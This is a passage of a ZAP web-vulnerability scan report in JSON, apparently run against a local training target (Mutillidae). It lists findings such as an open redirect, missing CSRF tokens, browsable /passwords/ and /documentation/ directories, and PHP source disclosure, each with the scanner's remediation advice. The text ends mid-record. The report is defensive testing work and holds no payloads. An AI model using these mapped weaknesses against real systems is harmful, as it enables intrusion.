@@ -1,0 +1,3041 @@
+{
+	"@programName": "ZAP",
+	"@version": "2.17.0",
+	"@generated": "Tue, 4 Aug 2026 20:19:42",
+	"created": "2026-08-04T20:19:42.313272420Z",
+	"insights":[
+		{
+			"level": "Low",
+			"reason": "Warning",
+			"site": "",
+			"key": "insight.log.warn",
+			"description": "ZAP warnings logged - see the zap.log file for details",
+			"statistic": "4"
+		},
+		{
+			"level": "Low",
+			"reason": "Exceeded High",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.response.slow",
+			"description": "Percentage of slow responses",
+			"statistic": "57"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.code.2xx",
+			"description": "Percentage of responses with status code 2xx",
+			"statistic": "57"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.code.3xx",
+			"description": "Percentage of responses with status code 3xx",
+			"statistic": "36"
+		},
+		{
+			"level": "Info",
+			"reason": "Exceeded Low",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.code.4xx",
+			"description": "Percentage of responses with status code 4xx",
+			"statistic": "5"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.code.5xx",
+			"description": "Percentage of responses with status code 5xx",
+			"statistic": "1"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.ctype.application/javascript",
+			"description": "Percentage of endpoints with content type application/javascript",
+			"statistic": "6"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.ctype.image/gif",
+			"description": "Percentage of endpoints with content type image/gif",
+			"statistic": "1"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.ctype.image/png",
+			"description": "Percentage of endpoints with content type image/png",
+			"statistic": "4"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.ctype.text/css",
+			"description": "Percentage of endpoints with content type text/css",
+			"statistic": "1"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.ctype.text/html",
+			"description": "Percentage of endpoints with content type text/html",
+			"statistic": "76"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.ctype.text/plain",
+			"description": "Percentage of endpoints with content type text/plain",
+			"statistic": "1"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.method.GET",
+			"description": "Percentage of endpoints with method GET",
+			"statistic": "93"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.method.POST",
+			"description": "Percentage of endpoints with method POST",
+			"statistic": "6"
+		},
+		{
+			"level": "Info",
+			"reason": "Informational",
+			"site": "http://host.docker.internal:25004",
+			"key": "insight.endpoint.total",
+			"description": "Count of total endpoints",
+			"statistic": "793"
+		}
+	],
+	"site":[ 
+		{
+			"@name": "http://host.docker.internal:25004",
+			"@host": "host.docker.internal",
+			"@port": "25004",
+			"@ssl": "false",
+			"alerts": [ 
+				{
+					"pluginid": "10028",
+					"alertRef": "10028",
+					"alert": "Off-site Redirect",
+					"name": "Off-site Redirect",
+					"riskcode": "3",
+					"confidence": "2",
+					"riskdesc": "High (Medium)",
+					"desc": "<p>Open redirects are one of the OWASP 2010 Top Ten vulnerabilities. This check looks at user-supplied input in query string parameters and POST data to identify where open redirects might be possible. Open redirects occur when an application allows user-supplied input (e.g. https://nottrusted.com) to control an off-site destination. This is generally a pretty accurate way to find where 301 or 302 redirects could be exploited by spammers or phishing attacks.</p><p></p><p>For example an attacker could supply a user with the following link: https://example.com/example.php?url=https://malicious.example.com.</p><p></p><p>NOTE: For the purposes of the passive check the authority portion of the origin and destination were compared. Manual testing may be required to validate the impact of this finding.</p>",
+					"instances":[ 
+						{
+							"id": "312",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/url.php?token=e415c9425c5cbf8477d80e5bb28fe9cb&url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Findex.html",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/url.php (token,url)",
+							"method": "GET",
+							"param": "url",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "The 301 or 302 response to a request for the following URL appeared to contain user input in the location header:\n\nhttp://host.docker.internal:25004/phpmyadmin/url.php?token=e415c9425c5cbf8477d80e5bb28fe9cb&url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Findex.html\n\nThe user input found was:\n\nurl=http://dev.mysql.com/doc/refman/5.5/en/index.html\n\nThe context was:\n\nhttp://dev.mysql.com/doc/refman/5.5/en/index.html"
+						}
+					],
+					"count": "1",
+					"systemic": false,
+					"solution": "<p>To avoid the open redirect vulnerability, parameters of the application script/program must be validated before sending 302 HTTP code (redirect) to the client browser. Implement safe redirect functionality that only redirects to relative URI's, or a list of trusted domains.</p>",
+					"otherinfo": "<p>The 301 or 302 response to a request for the following URL appeared to contain user input in the location header:</p><p></p><p>http://host.docker.internal:25004/phpmyadmin/url.php?token=e415c9425c5cbf8477d80e5bb28fe9cb&url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Findex.html</p><p></p><p>The user input found was:</p><p></p><p>url=http://dev.mysql.com/doc/refman/5.5/en/index.html</p><p></p><p>The context was:</p><p></p><p>http://dev.mysql.com/doc/refman/5.5/en/index.html</p>",
+					"reference": "<p>https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html</p><p>https://cwe.mitre.org/data/definitions/601.html</p>",
+					"cweid": "601",
+					"wascid": "38",
+					"sourceid": "1743"
+				},
+				{
+					"pluginid": "10202",
+					"alertRef": "10202",
+					"alert": "Absence of Anti-CSRF Tokens",
+					"name": "Absence of Anti-CSRF Tokens",
+					"riskcode": "2",
+					"confidence": "1",
+					"riskdesc": "Medium (Low)",
+					"desc": "<p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way. The nature of the attack is that CSRF exploits the trust that a web site has for a user. By contrast, cross-site scripting (XSS) exploits the trust that a user has for a web site. Like XSS, CSRF attacks are not necessarily cross-site, but they can be. Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.</p><p></p><p>CSRF attacks are effective in a number of situations, including:</p><p>    * The victim has an active session on the target site.</p><p>    * The victim is authenticated via HTTP auth on the target site.</p><p>    * The victim is on the same local network as the target site.</p><p></p><p>CSRF has primarily been used to perform an action against a target site using the victim's privileges, but recent techniques have been discovered to disclose information by gaining access to the response. The risk of information disclosure is dramatically increased when the target site is vulnerable to XSS, because XSS can be used as a platform for CSRF, allowing the attack to operate within the bounds of the same-origin policy.</p>",
+					"instances":[ 
+						{
+							"id": "28",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<form \taction=\"database-offline.php\"\r\n\t\t\tmethod=\"post\" \r\n\t\t\tenctype=\"application/x-www-form-urlencoded\"\r\n\t\t\tid=\"idDatabaseOffline\">",
+							"otherinfo": "No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token, _csrfToken] was found in the following HTML form: [Form 1: \"database-offline-php-submit-button\" ]."
+						},
+						{
+							"id": "170",
+							"uri": "http://host.docker.internal:25004/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<form action=\"https://www.paypal.com/cgi-bin/webscr\" method=\"post\" target=\"_blank\">",
+							"otherinfo": "No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token, _csrfToken] was found in the following HTML form: [Form 1: \"cmd\" \"hosted_button_id\" \"submit\" ]."
+						},
+						{
+							"id": "98",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<form \taction=\"database-offline.php\"\r\n\t\t\tmethod=\"post\" \r\n\t\t\tenctype=\"application/x-www-form-urlencoded\"\r\n\t\t\tid=\"idDatabaseOffline\">",
+							"otherinfo": "No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token, _csrfToken] was found in the following HTML form: [Form 1: \"database-offline-php-submit-button\" ]."
+						},
+						{
+							"id": "181",
+							"uri": "http://host.docker.internal:25004/index.php?page=view-someones-blog.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<form action=\"https://www.paypal.com/cgi-bin/webscr\" method=\"post\" target=\"_blank\">",
+							"otherinfo": "No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token, _csrfToken] was found in the following HTML form: [Form 1: \"cmd\" \"hosted_button_id\" \"submit\" ]."
+						},
+						{
+							"id": "160",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php ()(database-offline-php-submit-button)",
+							"method": "POST",
+							"param": "",
+							"attack": "",
+							"evidence": "<form \taction=\"database-offline.php\"\r\n\t\t\tmethod=\"post\" \r\n\t\t\tenctype=\"application/x-www-form-urlencoded\"\r\n\t\t\tid=\"idDatabaseOffline\">",
+							"otherinfo": "No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token, _csrfToken] was found in the following HTML form: [Form 1: \"database-offline-php-submit-button\" ]."
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Phase: Architecture and Design</p><p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p><p>For example, use anti-CSRF packages such as the OWASP CSRFGuard.</p><p></p><p>Phase: Implementation</p><p>Ensure that your application is free of cross-site scripting issues, because most CSRF defenses can be bypassed using attacker-controlled script.</p><p></p><p>Phase: Architecture and Design</p><p>Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330).</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</p><p>Note that this can be bypassed using XSS.</p><p></p><p>Use the ESAPI Session Management control.</p><p>This control includes a component for CSRF.</p><p></p><p>Do not use the GET method for any request that triggers a state change.</p><p></p><p>Phase: Implementation</p><p>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</p>",
+					"otherinfo": "<p>No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF, _token, _csrf_token, _csrfToken] was found in the following HTML form: [Form 1: \"database-offline-php-submit-button\" ].</p>",
+					"reference": "<p>https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</p><p>https://cwe.mitre.org/data/definitions/352.html</p>",
+					"cweid": "352",
+					"wascid": "9",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "90022",
+					"alertRef": "90022",
+					"alert": "Application Error Disclosure",
+					"name": "Application Error Disclosure",
+					"riskcode": "2",
+					"confidence": "2",
+					"riskdesc": "Medium (Medium)",
+					"desc": "<p>This page contains an error/warning message that may disclose sensitive information like the location of the file that produced the unhandled exception. This information can be used to launch further attacks against the web application. The alert could be a false positive if the error message is found inside a documentation page.</p>",
+					"instances":[ 
+						{
+							"id": "106",
+							"uri": "http://host.docker.internal:25004/classes/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/classes\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "127",
+							"uri": "http://host.docker.internal:25004/classes/?C=N;O=D",
+							"nodeName": "http:\/\/host.docker.internal:25004\/classes\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "100",
+							"uri": "http://host.docker.internal:25004/documentation/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "38",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "78",
+							"uri": "http://host.docker.internal:25004/javascript/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "107",
+							"uri": "http://host.docker.internal:25004/javascript/?C=N;O=D",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "105",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "125",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/?C=N;O=D",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "74",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						},
+						{
+							"id": "132",
+							"uri": "http://host.docker.internal:25004/passwords/?C=M;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Parent Directory",
+							"otherinfo": ""
+						}
+					],
+					"count": "10",
+					"systemic": false,
+					"solution": "<p>Review the source code of this page. Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on the server side and not exposing them to the user.</p>",
+					"otherinfo": "",
+					"reference": "",
+					"cweid": "550",
+					"wascid": "13",
+					"sourceid": "22"
+				},
+				{
+					"pluginid": "10038",
+					"alertRef": "10038-1",
+					"alert": "Content Security Policy (CSP) Header Not Set",
+					"name": "Content Security Policy (CSP) Header Not Set",
+					"riskcode": "2",
+					"confidence": "3",
+					"riskdesc": "Medium (High)",
+					"desc": "<p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page \u2014 covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.</p>",
+					"instances":[ 
+						{
+							"id": "25",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "39",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "79",
+							"uri": "http://host.docker.internal:25004/javascript/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "76",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "9",
+							"uri": "http://host.docker.internal:25004/sitemap.xml",
+							"nodeName": "http:\/\/host.docker.internal:25004\/sitemap.xml",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP</p><p>https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</p><p>https://www.w3.org/TR/CSP/</p><p>https://w3c.github.io/webappsec-csp/</p><p>https://web.dev/articles/csp</p><p>https://caniuse.com/#feat=contentsecuritypolicy</p><p>https://content-security-policy.com/</p>",
+					"cweid": "693",
+					"wascid": "15",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "10033",
+					"alertRef": "10033",
+					"alert": "Directory Browsing",
+					"name": "Directory Browsing",
+					"riskcode": "2",
+					"confidence": "2",
+					"riskdesc": "Medium (Medium)",
+					"desc": "<p>It is possible to view a listing of the directory contents. Directory listings may reveal hidden scripts, include files, backup source files, etc., which can be accessed to reveal sensitive information.</p>",
+					"instances":[ 
+						{
+							"id": "103",
+							"uri": "http://host.docker.internal:25004/documentation/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<title>Index of /documentation</title>",
+							"otherinfo": "Web server identified: Apache 2"
+						},
+						{
+							"id": "40",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<title>Index of /documentation</title>",
+							"otherinfo": "Web server identified: Apache 2"
+						},
+						{
+							"id": "83",
+							"uri": "http://host.docker.internal:25004/javascript/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<title>Index of /javascript</title>",
+							"otherinfo": "Web server identified: Apache 2"
+						},
+						{
+							"id": "111",
+							"uri": "http://host.docker.internal:25004/javascript/?C=N;O=D",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<title>Index of /javascript</title>",
+							"otherinfo": "Web server identified: Apache 2"
+						},
+						{
+							"id": "77",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<title>Index of /passwords</title>",
+							"otherinfo": "Web server identified: Apache 2"
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Configure the web server to disable directory browsing.</p>",
+					"otherinfo": "<p>Web server identified: Apache 2</p>",
+					"reference": "<p>https://cwe.mitre.org/data/definitions/548.html</p>",
+					"cweid": "548",
+					"wascid": "16",
+					"sourceid": "20"
+				},
+				{
+					"pluginid": "10041",
+					"alertRef": "10041",
+					"alert": "HTTP to HTTPS Insecure Transition in Form Post",
+					"name": "HTTP to HTTPS Insecure Transition in Form Post",
+					"riskcode": "2",
+					"confidence": "2",
+					"riskdesc": "Medium (Medium)",
+					"desc": "<p>This check looks for insecure HTTP pages that host HTTPS forms. The issue is that an insecure HTTP page can easily be hijacked through MITM and the secure HTTPS form can be replaced or spoofed.</p>",
+					"instances":[ 
+						{
+							"id": "212",
+							"uri": "http://host.docker.internal:25004/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "https://www.paypal.com/cgi-bin/webscr",
+							"otherinfo": "The response to the following request over HTTP included an HTTPS form tag action attribute value:\n\nhttp://host.docker.internal:25004/\nThe context was:\n\n<form action=\"https://www.paypal.com/cgi-bin/webscr\" method=\"post\" target=\"_blank\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"cmd\" value=\"_s-xclick\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"hosted_button_id\" value=\"45R3YEXENU97S\">\r\n\t\t\t\t\t<input type=\"image\" src=\"https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif\" border=\"0\" name=\"submit\" alt=\"PayPal - The safer, easier way to pay online!\">\r\n\t\t\t\t\t<img alt=\"\" border=\"0\" src=\"https://www.paypalobjects.com/en_US/i/scr/pixel.gif\" width=\"1\" height=\"1\">\r\n\t\t\t\t</form>"
+						},
+						{
+							"id": "220",
+							"uri": "http://host.docker.internal:25004/index.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "https://www.paypal.com/cgi-bin/webscr",
+							"otherinfo": "The response to the following request over HTTP included an HTTPS form tag action attribute value:\n\nhttp://host.docker.internal:25004/index.php\nThe context was:\n\n<form action=\"https://www.paypal.com/cgi-bin/webscr\" method=\"post\" target=\"_blank\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"cmd\" value=\"_s-xclick\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"hosted_button_id\" value=\"45R3YEXENU97S\">\r\n\t\t\t\t\t<input type=\"image\" src=\"https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif\" border=\"0\" name=\"submit\" alt=\"PayPal - The safer, easier way to pay online!\">\r\n\t\t\t\t\t<img alt=\"\" border=\"0\" src=\"https://www.paypalobjects.com/en_US/i/scr/pixel.gif\" width=\"1\" height=\"1\">\r\n\t\t\t\t</form>"
+						},
+						{
+							"id": "217",
+							"uri": "http://host.docker.internal:25004/index.php?page=xml-validator.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "https://www.paypal.com/cgi-bin/webscr",
+							"otherinfo": "The response to the following request over HTTP included an HTTPS form tag action attribute value:\n\nhttp://host.docker.internal:25004/index.php?page=xml-validator.php\nThe context was:\n\n<form action=\"https://www.paypal.com/cgi-bin/webscr\" method=\"post\" target=\"_blank\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"cmd\" value=\"_s-xclick\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"hosted_button_id\" value=\"45R3YEXENU97S\">\r\n\t\t\t\t\t<input type=\"image\" src=\"https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif\" border=\"0\" name=\"submit\" alt=\"PayPal - The safer, easier way to pay online!\">\r\n\t\t\t\t\t<img alt=\"\" border=\"0\" src=\"https://www.paypalobjects.com/en_US/i/scr/pixel.gif\" width=\"1\" height=\"1\">\r\n\t\t\t\t</form>"
+						},
+						{
+							"id": "233",
+							"uri": "http://host.docker.internal:25004/index.php?page=home.php&popUpNotificationCode=HPH0",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page,popUpNotificationCode)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "https://www.paypal.com/cgi-bin/webscr",
+							"otherinfo": "The response to the following request over HTTP included an HTTPS form tag action attribute value:\n\nhttp://host.docker.internal:25004/index.php?page=home.php&popUpNotificationCode=HPH0\nThe context was:\n\n<form action=\"https://www.paypal.com/cgi-bin/webscr\" method=\"post\" target=\"_blank\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"cmd\" value=\"_s-xclick\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"hosted_button_id\" value=\"45R3YEXENU97S\">\r\n\t\t\t\t\t<input type=\"image\" src=\"https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif\" border=\"0\" name=\"submit\" alt=\"PayPal - The safer, easier way to pay online!\">\r\n\t\t\t\t\t<img alt=\"\" border=\"0\" src=\"https://www.paypalobjects.com/en_US/i/scr/pixel.gif\" width=\"1\" height=\"1\">\r\n\t\t\t\t</form>"
+						}
+					],
+					"count": "4",
+					"systemic": false,
+					"solution": "<p>Use HTTPS for landing pages that host secure forms.</p>",
+					"otherinfo": "<p>The response to the following request over HTTP included an HTTPS form tag action attribute value:</p><p></p><p>http://host.docker.internal:25004/</p><p>The context was:</p><p></p><p><form action=\"https://www.paypal.com/cgi-bin/webscr\" method=\"post\" target=\"_blank\"></p><p>\t\t\t\t\t<input type=\"hidden\" name=\"cmd\" value=\"_s-xclick\"></p><p>\t\t\t\t\t<input type=\"hidden\" name=\"hosted_button_id\" value=\"45R3YEXENU97S\"></p><p>\t\t\t\t\t<input type=\"image\" src=\"https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif\" border=\"0\" name=\"submit\" alt=\"PayPal - The safer, easier way to pay online!\"></p><p>\t\t\t\t\t<img alt=\"\" border=\"0\" src=\"https://www.paypalobjects.com/en_US/i/scr/pixel.gif\" width=\"1\" height=\"1\"></p><p>\t\t\t\t</form></p>",
+					"reference": "",
+					"cweid": "319",
+					"wascid": "15",
+					"sourceid": "352"
+				},
+				{
+					"pluginid": "10020",
+					"alertRef": "10020-1",
+					"alert": "Missing Anti-clickjacking Header",
+					"name": "Missing Anti-clickjacking Header",
+					"riskcode": "2",
+					"confidence": "2",
+					"riskdesc": "Medium (Medium)",
+					"desc": "<p>The response does not protect against 'ClickJacking' attacks. It should include either Content-Security-Policy with 'frame-ancestors' directive or X-Frame-Options.</p>",
+					"instances":[ 
+						{
+							"id": "18",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "x-frame-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "85",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php",
+							"method": "GET",
+							"param": "x-frame-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "37",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "x-frame-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "73",
+							"uri": "http://host.docker.internal:25004/javascript/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/",
+							"method": "GET",
+							"param": "x-frame-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						},
+						{
+							"id": "71",
+							"uri": "http://host.docker.internal:25004/passwords/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/passwords\/",
+							"method": "GET",
+							"param": "x-frame-options",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": ""
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Modern Web browsers support the Content-Security-Policy and X-Frame-Options HTTP headers. Ensure one of them is set on all web pages returned by your site/app.</p><p>If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively consider implementing Content Security Policy's \"frame-ancestors\" directive.</p>",
+					"otherinfo": "",
+					"reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Frame-Options</p>",
+					"cweid": "1021",
+					"wascid": "15",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "10099",
+					"alertRef": "10099",
+					"alert": "Source Code Disclosure - PHP",
+					"name": "Source Code Disclosure - PHP",
+					"riskcode": "2",
+					"confidence": "2",
+					"riskdesc": "Medium (Medium)",
+					"desc": "<p>Application Source Code was disclosed by the web server. - PHP</p>",
+					"instances":[ 
+						{
+							"id": "145",
+							"uri": "http://host.docker.internal:25004/documentation/Mutillidae-Test-Scripts.txt",
